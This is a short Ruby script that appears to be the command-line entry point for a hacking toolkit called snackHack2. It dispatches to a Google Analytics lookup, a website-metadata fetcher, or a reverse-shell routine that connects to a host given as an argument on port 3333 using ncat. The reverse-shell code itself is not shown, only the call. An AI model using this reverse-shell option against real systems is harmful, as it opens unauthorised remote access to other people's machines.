
require './lib/snackHack2'
input = ARGV[0].downcase
if input.eql?("ga")
	ga = Snackhack2::GoogleAnalytics.new
    ga.site = ARGV[1]
    ga.run
elsif input.eql?("wm")
	Snackhack2::WebsiteMeta.new(ARGV[1]).run
elsif input.eql?("rs")
	port = 3333
	Snackhack2::ReverseShell.new(ARGV[1], port).ncat
end